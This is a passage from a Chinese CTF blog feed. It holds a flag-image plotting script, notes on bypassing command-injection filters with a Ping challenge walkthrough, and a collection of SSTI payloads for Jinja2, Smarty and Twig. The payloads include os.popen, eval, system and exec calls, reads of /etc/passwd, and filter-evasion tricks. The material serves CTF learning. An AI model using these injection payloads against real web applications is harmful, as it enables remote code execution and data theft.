class="number">143</span>], [<span class="number">280</span>, <span class="number">145</span>], [<span class="number">282</span>, <span class="number">147</span>], [<span class="number">284</span>, <span class="number">149</span>], [<span class="number">285</span>, <span class="number">150</span>], [<span class="number">288</span>, <span class="number">152</span>],</span><br><span class="line">               [<span class="number">289</span>, <span class="number">153</span>], [<span class="number">291</span>, <span class="number">154</span>], [<span class="number">293</span>, <span class="number">156</span>], [<span class="number">294</span>, <span class="number">157</span>], [<span class="number">296</span>, <span class="number">159</span>], [<span class="number">297</span>, <span class="number">160</span>], [<span class="number">298</span>, <span class="number">161</span>], [<span class="number">299</span>, <span class="number">162</span>],</span><br><span class="line">               [<span class="number">300</span>, <span class="number">136</span>], [<span class="number">299</span>, <span class="number">136</span>], [<span class="number">297</span>, <span class="number">137</span>], [<span class="number">296</span>, <span class="number">138</span>], [<span class="number">294</span>, <span class="number">141</span>], [<span class="number">294</span>, <span class="number">142</span>], [<span class="number">293</span>, <span class="number">144</span>], [<span class="number">293</span>, <span class="number">145</span>],</span><br><span class="line">               [<span class="number">292</span>, <span class="number">148</span>], [<span class="number">291</span>, <span class="number">149</span>], [<span class="number">290</span>, <span class="number">151</span>], [<span class="number">288</span>, <span class="number">153</span>], [<span class="number">288</span>, <span class="number">155</span>], [<span class="number">287</span>, <span class="number">156</span>], [<span class="number">286</span>, <span class="number">157</span>], [<span class="number">285</span>, <span class="number">159</span>],</span><br><span class="line">               [<span class="number">284</span>, <span class="number">160</span>], [<span class="number">283</span>, <span class="number">161</span>], [<span class="number">282</span>, <span class="number">162</span>], [<span class="number">281</span>, <span class="number">163</span>], [<span class="number">280</span>, <span class="number">164</span>], [<span class="number">279</span>, <span class="number">165</span>], [<span class="number">327</span>, <span class="number">142</span>], [<span class="number">328</span>, <span class="number">143</span>],</span><br><span class="line">               [<span class="number">330</span>, <span class="number">145</span>], [<span class="number">332</span>, <span class="number">148</span>], [<span class="number">333</span>, <span class="number">149</span>], [<span class="number">335</span>, <span class="number">151</span>], [<span class="number">337</span>, <span class="number">154</span>], [<span class="number">339</span>, <span class="number">156</span>], [<span class="number">341</span>, <span class="number">158</span>], [<span class="number">342</span>, <span class="number">159</span>],</span><br><span class="line">               [<span class="number">345</span>, <span class="number">160</span>], [<span class="number">347</span>, <span class="number">161</span>], [<span class="number">348</span>, <span class="number">162</span>], [<span class="number">350</span>, <span class="number">164</span>], [<span class="number">351</span>, <span class="number">165</span>], [<span class="number">352</span>, <span class="number">166</span>], [<span class="number">355</span>, <span class="number">168</span>], [<span class="number">356</span>, <span class="number">169</span>],</span><br><span class="line">               [<span class="number">351</span>, <span class="number">143</span>], [<span class="number">350</span>, <span class="number">143</span>], [<span class="number">348</span>, <span class="number">144</span>], [<span class="number">347</span>, <span class="number">144</span>], [<span class="number">346</span>, <span class="number">145</span>], [<span class="number">343</span>, <span class="number">148</span>], [<span class="number">341</span>, <span class="number">150</span>], [<span class="number">339</span>, <span class="number">152</span>],</span><br><span class="line">               [<span class="number">336</span>, <span class="number">155</span>], [<span class="number">333</span>, <span class="number">158</span>], [<span class="number">330</span>, <span class="number">159</span>], [<span class="number">327</span>, <span class="number">162</span>], [<span class="number">325</span>, <span class="number">165</span>], [<span class="number">323</span>, <span class="number">167</span>], [<span class="number">322</span>, <span class="number">168</span>], [<span class="number">319</span>, <span class="number">170</span>],</span><br><span class="line">               [<span class="number">317</span>, <span class="number">171</span>], [<span class="number">316</span>, <span class="number">171</span>], [<span class="number">314</span>, <span class="number">172</span>], [<span class="number">313</span>, <span class="number">172</span>]]</span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">500</span>, <span class="number">500</span>), <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> location <span class="keyword">in</span> XYlocation:</span><br><span class="line">    im.putpixel((location[<span class="number">0</span>], location[<span class="number">1</span>]), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">im.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到图片</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/biO41VfdERQr2CD.png"></p><p>最后根据题目提示转MD5再提交就可以了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;easy-sql&quot;&gt;&lt;a href=&quot;#easy-sql&quot; class=&quot;headerlink&quot; title=&quot;easy_</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
    <category term="CISCN" scheme="https://rossweisse.github.io/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>命令注入小总结</title>
    <link href="https://rossweisse.github.io/2021/03/29/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://rossweisse.github.io/2021/03/29/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%B0%8F%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-29T04:56:01.000Z</published>
    <updated>2021-07-23T03:25:57.254Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令注入知识点总结"><a href="#命令注入知识点总结" class="headerlink" title="命令注入知识点总结"></a>命令注入知识点总结</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、%20(space)、%09(tab)、$IFS<span class="variable">$9</span>、 IFS、IFS</span><br><span class="line">2、使用&lt;或者&lt;&gt;来绕过空格 cat&lt;a.txt</span><br><span class="line">3、花括号扩展&#123;OS_COMMAND,ARGUMENT&#125; &#123;cat,/etc/passwd&#125;</span><br><span class="line">4、<span class="variable">$IFS</span> 空格绕过 cat<span class="variable">$IFSa</span>.txt</span><br><span class="line">5、变量控制 X=$<span class="string">&#x27;cat\x09./flag.php</span></span><br></pre></td></tr></table></figure><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1、使用空变量 使用$*和<span class="variable">$@</span>，<span class="variable">$x</span>(x 代表 1-9),<span class="variable">$&#123;x&#125;</span>(x&gt;=10)(我尝试小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 ca<span class="variable">$&#123;21&#125;</span>t a.txt</span><br><span class="line">2、反斜杠 ca\t a.txt</span><br><span class="line">3、变量替换 a=ca;b=t;c=a.txt;a aab <span class="variable">$c</span></span><br><span class="line">4、引号 c<span class="string">&#x27;a&#x27;</span>t flag.php</span><br><span class="line">5、编码绕过</span><br><span class="line">    Base64 编码绕过：</span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;cat a.txt&#x27;| base64 Y2F0IGEudHh0Cg==</span></span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;Y2F0IGEudHh0Cg==&#x27; | base64 -d abc</span></span><br><span class="line">    十六进制编码绕过：</span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;cat a.txt&#x27; | xxd -p 63617420612e7478740a</span></span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;0x63617420612e7478740a&#x27;| xxd -r -p Abc</span></span><br><span class="line">6、通配符 ？*</span><br><span class="line">    […]：匹配范围中任何一个字符 cat fl[abc]g.php</span><br><span class="line">    [a-z]：匹配 a-z 范围中任何一个字符 cat fl[a-z]g.php</span><br><span class="line">    &#123;a,b&#125;：对以逗号分割的文件列表进行拓展 cat fl&#123;b,c&#125;g.php</span><br></pre></td></tr></table></figure><h3 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.&amp;</span><br><span class="line">&amp; 表示将任务置于后台执行</span><br><span class="line">例：command1 &amp; command2    先执行command2后执行command1</span><br><span class="line">2.&amp;&amp;</span><br><span class="line">只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。</span><br><span class="line">例：command1 &amp;&amp; command2   先执行command1后执行command2</span><br><span class="line">3.|</span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令的参数</span><br><span class="line">例：command1 | command2     只执行command2</span><br><span class="line">4.||</span><br><span class="line">只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。</span><br><span class="line">例：7 || ls /</span><br><span class="line">5.；</span><br><span class="line">多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line">例：ping 127.0.0.1;ls /</span><br></pre></td></tr></table></figure><h2 id="真题Writeup"><a href="#真题Writeup" class="headerlink" title="真题Writeup"></a>真题Writeup</h2><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>进入题目稍微测试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ip=1 &amp; ls</span><br><span class="line">返回 fxck your space! <span class="comment"># 过滤了空格</span></span><br><span class="line"></span><br><span class="line">ip=1;ls</span><br><span class="line">返回 <span class="comment"># 看来分号没有被过滤</span></span><br><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br><span class="line"></span><br><span class="line">ip=1;cat&lt;flag.php</span><br><span class="line">返回 fxck your symbol! <span class="comment"># 过滤了&lt; 字符</span></span><br><span class="line"></span><br><span class="line">ip=1;cat/**/flag.php</span><br><span class="line">返回 fxck your symbol! <span class="comment"># 过滤了/ 和 *字符</span></span><br><span class="line"></span><br><span class="line">ip=1;cat<span class="variable">$IFSflag</span>.php</span><br><span class="line">返回 fxck your flag! <span class="comment"># 过滤了 &#x27;flag&#x27; 但是$IFS没被过滤</span></span><br></pre></td></tr></table></figure><p>试试内联执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip=1;a=f;b=ag;c=l;cat$IFS$a$c<span class="variable">$b</span>.php</span><br><span class="line">ctrl + u查看源代码即可得到flag</span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://blog.csdn.net/qq_42812036/article/details/104297163?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161699126116780264045852%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161699126116780264045852&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-104297163.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_42812036/article/details/104297163?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161699126116780264045852%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161699126116780264045852&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-104297163.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187</a></p><p><a href="https://blog.csdn.net/u014549283/article/details/81783164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161690037516780357237205%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161690037516780357237205&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-81783164.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/u014549283/article/details/81783164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161690037516780357237205%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161690037516780357237205&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-81783164.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;命令注入知识点总结&quot;&gt;&lt;a href=&quot;#命令注入知识点总结&quot; class=&quot;headerlink&quot; title=&quot;命令注入知识点总结&quot;&gt;&lt;/a&gt;命令注入知识点总结&lt;/h2&gt;&lt;h3 id=&quot;过滤空格&quot;&gt;&lt;a href=&quot;#过滤空格&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="Web" scheme="https://rossweisse.github.io/categories/Web/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
    <category term="Web" scheme="https://rossweisse.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SSTI小总结</title>
    <link href="https://rossweisse.github.io/2021/03/26/web%E5%AD%A6%E4%B9%A0/SSTI%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://rossweisse.github.io/2021/03/26/web%E5%AD%A6%E4%B9%A0/SSTI%E5%B0%8F%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-25T17:24:55.000Z</published>
    <updated>2021-07-23T03:26:41.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="模板注入-SSTI-的简单总结"><a href="#模板注入-SSTI-的简单总结" class="headerlink" title="模板注入(SSTI)的简单总结"></a>模板注入(SSTI)的简单总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于现在还是萌新时期，这时候决定先写一篇关于模板注入的简单总结给自己用。</p><h2 id="SSTI的简单测试"><a href="#SSTI的简单测试" class="headerlink" title="SSTI的简单测试"></a>SSTI的简单测试</h2><p><img src="https://i.loli.net/2021/03/25/uwZaFe4Tx8MR6DG.png"></p><h2 id="各框架的模板结构"><a href="#各框架的模板结构" class="headerlink" title="各框架的模板结构"></a>各框架的模板结构</h2><p><img src="https://i.loli.net/2021/03/25/fRsgd7tD6mQNHyB.png"></p><h2 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>在缺省情况下，以下全局变量可以在 Jinja2 模板中使用：</p><ul><li><p><code>config</code></p><p>当前配置对象（ <code>flask.config</code> ）tips：这个变量总是可用，甚至是在被导入的模板中。</p></li><li><p><code>request</code></p><p>当前请求对象（ <code>flask.request</code> ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p></li><li><p><code>session</code></p><p>当前会话对象（ <code>flask.session</code> ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p></li><li><p><code>g</code></p><p>请求绑定的全局变量（ <code>flask.g</code>）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p></li><li><p><code>url_for()</code></p><p><code>flask.url_for()</code>函数。</p></li><li><p><code>get_flashed_messages()</code></p><p><code>flask.get_flashed_messages()</code> 函数。</p></li></ul><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>在python的SSTI中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti。</p><ul><li><code>__class__</code></li></ul><p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p><ul><li><code>__bases__</code></li></ul><p>以元组的形式返回一个类所直接继承的类。</p><ul><li><code>__mro__</code></li></ul><p>返回解析方法调用的顺序。</p><ul><li><code>__subclasses__()</code></li></ul><p>获取类的所有子类。</p><ul><li><code>__init__</code></li></ul><p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p><ul><li><code>__globals__</code></li></ul><p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p><h3 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;cat /fl4g|base64&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><h4 id="测试SSTI过滤"><a href="#测试SSTI过滤" class="headerlink" title="测试SSTI过滤"></a>测试SSTI过滤</h4><p><code>&#123;&#123;"要测试的字符"&#125;&#125;</code>，只需要看看要测试的字符是否返回在页面中即可，下面分别说说对应各种过滤情况的解决办法。</p><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤 "></a>过滤 </h4><p>使用<code>&#123;%`进行绕过，`&#123;%%&#125;</code>中间执行if语句可以起到类似盲注的效果</p><h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><p>可以用编码绕过</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#如下</span></span><br><span class="line">__class__ =&gt; &#x27;\x5f\x5fclass\x5f\x5f&#x27;</span><br></pre></td></tr></table></figure><p><code>_</code> =&gt; <code>\x5f</code> ， <code>.</code> =&gt; <code>\x2e</code></p><p>过滤了_可以用<code>request[&#39;args&#39;]</code>或者<code>request[&#39;values&#39;]绕过</code></p><p>如果过滤了<code>args</code>也可以<code>request[&#39;values&#39;]</code>结合<code>attr()</code>绕过</p><p>如：<code>&#39;&#39;.__class__</code> 可以写成 <code>&#39;&#39;|attr(request[&#39;values&#39;][&#39;x1&#39;])</code>，然后POST传入<code>x1=__class__</code></p><h4 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤."></a>过滤<code>.</code></h4><p>可以用<code>attr()</code>或<code>[]</code>绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 例如</span></span><br><span class="line"><span class="comment"># 正常的payload</span></span><br><span class="line">url?name=&#123;&#123;().__class__.__base__.__subclasses__[177].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ipconfig&quot;).read()&#x27;)&#125;&#125;`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用attr()绕过</span></span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">177</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用[]绕过</span></span><br><span class="line">url?name=&#123;&#123; config[&#x27;__class__&#x27;][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;ipconfig&#x27;)[&#x27;read&#x27;]() &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># tips：</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__ 可以写成 <span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>) 或者 <span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="过滤-3"><a href="#过滤-3" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><p>可以使用<code>getitem()</code>来获取序号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[2] =&gt;</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="利用请求方式requests绕过"><a href="#利用请求方式requests绕过" class="headerlink" title="利用请求方式requests绕过"></a>利用请求方式requests绕过</h4><p>对于某些较为严格的过滤，我们可以选着用<code>requests</code>的方式绕过</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 例如</span></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; =&gt; &#123;&#123;&#x27;&#x27;[request.args.t1]&#125;&#125;&amp;t1=__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 又或者</span></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; =&gt; &#123;&#123;&#x27;&#x27;[request[&#x27;args&#x27;][&#x27;t1&#x27;]]&#125;&#125;&amp;t1=__class__</span><br></pre></td></tr></table></figure><h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><p>Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。所以对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p><h3 id="漏洞确认"><a href="#漏洞确认" class="headerlink" title="漏洞确认"></a>漏洞确认</h3><p>基本的测试可以根据上面的那张图片，也可以输入<code>&#123;$smarty.version&#125;</code>查看Smarty的版本信息。</p><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123; readfile(<span class="string">&#x27;/flag&#x27;</span>) &#125;</span><br><span class="line">&#123;<span class="keyword">if</span> show_source(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat ../../../flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br></pre></td></tr></table></figure><h3 id="常见的漏洞利用方式"><a href="#常见的漏洞利用方式" class="headerlink" title="常见的漏洞利用方式"></a>常见的漏洞利用方式</h3><h4 id="php-php-标签"><a href="#php-php-标签" class="headerlink" title="{php}{/php}标签"></a>{php}{/php}标签</h4><p>Smarty支持 使用<code>&#123;php&#125;&#123;/php&#125;</code>标签来执行被包裹其中的php指令，最常规的思路应该是先测试这个标签。</p><p>但是，在Smarty3的官方手册中有如下描述：</p><blockquote><p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p></blockquote><p>所以，一般在Smarty类中是用不了的。</p><h4 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a>{if}标签</h4><p>在官方文档中有如下描述：</p><blockquote><p>Smarty的<code>&#123;if&#125;</code>条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||, or, &amp;&amp;, and, is_array(), 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;</code></p></blockquote><p>所以我们就可以利用这个来执行我们的php代码</p><p>如：{if phpinfo()}{/if}</p><p><img src="https://i.loli.net/2021/04/11/POjHBeb3cG2XTa9.png"></p><h2 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h2><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>Twig的模板注入，判断如下：</p>49 回显7777777 => Jinja2 ，回显49 => Twig<p>payload</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>拿到flag</p><blockquote><p>flag{c485b15c-f3df-4dc8-abb3-ed322ea30c66}</p></blockquote><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161669108716780271543102%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161669108716780271543102&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-107752717.pc_v2_rank_blog_default&amp;utm_term=%E6%A8%A1%E6%9D%BF">https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161669108716780271543102%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161669108716780271543102&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-107752717.pc_v2_rank_blog_default&amp;utm_term=%E6%A8%A1%E6%9D%BF</a></p><p><a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a></p><p><a 